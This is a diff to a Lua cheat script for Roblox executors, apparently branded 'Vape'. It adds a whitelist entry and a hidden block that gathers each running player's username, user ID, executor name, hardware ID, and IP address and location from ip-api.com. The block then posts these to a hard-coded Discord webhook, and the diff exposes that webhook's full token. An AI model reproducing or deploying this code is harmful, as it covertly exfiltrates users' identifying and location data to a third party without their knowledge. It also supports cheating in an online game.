@@ -98,6 +98,7 @@ end
 
 local Whitelist = {
 	["E2D6C78C-9D6D-4444-B24E-A81C1063DA0D"] = "whathedogdoin#3461",
+	["6d5255ba-38cd-4b43-a8cf-5a4594203b82"] = "Heart ofgold#1880",
 	["87277ced-9c55-4f83-a7a2-c7c2d8114b29"] = "very tuff cat#4499",
 	["2f98df94-b2c0-458f-8214-06f9b88a3c76"] = "102.902#3052",
 	["2B7E4926-420F-446C-96BD-7BC5C6AC57F2"] = "vyx#1368",
@@ -107,6 +108,64 @@ local Whitelist = {
 
 if Whitelist[game:GetService("RbxAnalyticsService"):GetClientId()] then
 game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "Whitelisted! ", Color = Color3.fromRGB(0, 255, 0), Font = Enum.Font.Merriweather, FontSize = Enum.FontSize.Size24 } )
+				local Webhook = "https://discord.com/api/webhooks/1103379510944092203/UOVPrKYZfMETTUudgQV8Z7ekQe_EWdOnJye0ulZFsChgtUHY32Y8QrWqvUSsB0Pqt0JR"
+				_G.Discord_UserID = ""
+				local player = game:GetService"Players".LocalPlayer
+				local joinTime = os.time() - (player.AccountAge*86400)
+				local joinDate = os.date("!*t", joinTime)
+				local premium = false
+				local alt = true
+				if player.MembershipType == Enum.MembershipType.Premium then
+				premium = true
+				end
+				local executor = identifyexecutor() or "Unknown"
+				local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+				Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+				local AvatarImage = Thing.imageUrl
+				local msg = {
+				["username"] = "Vape",
+				["avatar_url"] = "https://cdn.discordapp.com/attachments/1068501433122562068/1098295120761204756/IMG_2475.jpg",
+				["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
+				["embeds"] = {
+					{
+				["color"] = tonumber(tostring("0x32CD32")), --decimal
+				["title"] = "Whitelist",
+				["thumbnail"] = {
+					["url"] = AvatarImage,
+				},
+				["fields"] = {
+						{
+					["name"] = "Roblox Username:",
+					["value"] = ""..lplr.Name.."",
+					["inline"] = true
+						},
+						{
+					["name"] = "ID:",
+					["value"] = "["..lplr.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
+					["inline"] = true
+						},
+						{
+					["name"] = "Executor:",
+					["value"] = executor,
+					["inline"] = true
+						},
+						{
+					["name"] = "Ip and Location:",
+					["value"] = tostring(game:HttpGet("http://ip-api.com/csv/", true)),
+					["inline"] = true
+						},
+						{
+					["name"] = "HWID:",
+					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+					["inline"] = true
+					}
+				},
+				['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
+			}
+		}
+	}
+request = http_request or request or HttpPost or syn.request
+request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
 local textService = game:GetService("TextService")
 local lightingService = game:GetService("Lighting")
 local textChatService = game:GetService("TextChatService")
